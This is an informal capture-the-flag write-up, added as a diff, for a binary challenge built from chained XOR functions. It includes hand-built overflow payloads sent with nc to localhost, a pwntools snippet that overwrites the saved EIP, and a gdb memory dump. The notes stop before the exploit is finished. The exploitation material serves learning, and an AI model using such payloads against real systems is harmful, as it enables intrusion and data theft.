@@ -1,0 +1,132 @@
+Writeup
+
+
+so there are 256 functions
+
+function_<X> has key (4*X + 0x84)%256
+
+it xor's the current input with it's key
+and then calls function_<new_input[0]> with new_input[1:]
+
+this way it gets smaller each time
+
+
+By playing around I found how to generate 
+a chain that kept calling the same function
+
+for function <a> compose the string
+
+a s(a) t(a) s(a) t(a) ...
+where:
+f = lambda a: (4*a + 0x84)%256
+s = lambda a: hex(a ^ f(a) ^ f(f(a) ^ a))
+t = lambda a: hex(a ^ f(f(a) ^ a))
+
+this was found by tracing the xors 
+
+
+printf '\x80\x90\x14\x90\x14\x90\x14\x90\x14\x90\x14' | nc localhost 1337
+
+... 
+
+in function func_b2, count is 11, bufsize is 0x84
+in function func_36, count is 10, bufsize is 0x94
+in function func_b2, count is 9, bufsize is 0x84
+in function func_b2, count is 8, bufsize is 0x84
+in function func_b2, count is 7, bufsize is 0x84
+in function func_b2, count is 6, bufsize is 0x84
+in function func_b2, count is 5, bufsize is 0x84
+in function func_b2, count is 4, bufsize is 0x84
+in function func_b2, count is 3, bufsize is 0x84
+in function func_b2, count is 2, bufsize is 0x84
+in function func_b2, count is 1, bufsize is 0x84
+
+
+len 8: 
+\x80\x90\x14\x90\x14\x90\x14\x90
+
+0xf1 -f> key: 8
+
+12345678 <- the 8 legit things we can put in 
+
+0000 <- override the counter
+
+when we overflow, we write over the counter
+To make sure that our whole payload gets copied
+and we don't copy any extra junk this needs to 
+be fixed
+
+this is the important one
+------------------------------------
+								    |
+								    v
+\x80\x90\x14\x90\x14\x14\xf1123456780000
+
+I'll find what it is and then xor appropriatley to get 0x09
+which is what it should be
+k so it loads 0x29
+\x80\x90\x14\x90\x14\x14\xf11234567\x29000
+
+
+after more fidiling
+at this point in the chain buf is like 0x10 so it flips bits for all the nulls
+the 0x10's mean do nothing
+
+\x80\x90\x14\x90\x14\x90\x14\xf1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x10\x10\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+
+
+\x80\x90\x14\x90\x14\x90\x14\xf1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x10\x10\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+
+
+
+ok now it's time to move to python
+
+conn = remote('localhost', 1337)
+
+payload = "\x80\x90\x14\x90\x14\x90\x14\xf1"
+nulls = '\x10'*(6*4 + 1) 
+
+saved_eip = 0x804e06c
+zor = 0x10101010 #nulls -> 1010101, therefore 10101010 -> 000000 i.e no effect yay ninja
+
+flag_loc = 0x805b6c0
+
+eip_null = p32(saved_eip ^ zor)
+
+conn.sendline(payload + nulls + eip_null)
+
+
+
+At this point, I control eip
+
+I'm going to call:
+int sock_send(int sockfd, char *buf, size_t length);
+
+from inspection sockfd == 0x4 
+
+0xffeabb40:	0xffeabb58 -> flag??
+
+
+
+
+
+
+gdb-peda$ x/32wx 0xffb375f0
+0xffb375f0:	0x086faac0	0x08080808	0x08080808	0x0000001c
+0xffb37600:	0xf76faac0	0xf767cc1d	0xffb376b8	0x0805454d
+0xffb37610:	0xffb37628	0x0000003d	0x00000084	0x00000000
+0xffb37620:	0x00000000	0xe1000000	0x00000000	0x00000000
+0xffb37630:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffb37640:	0x01a52100	0x00000000	0x00000000	0x00000000
+0xffb37650:	0x00000000	0x0487db00	0x00000408	0x05b6c0e1
+0xffb37660:	0x0000ff08	0x84848400	0x84848484	0x84848484
+gdb-peda$ c 4
+
+
+
+
+
+
+
+
+
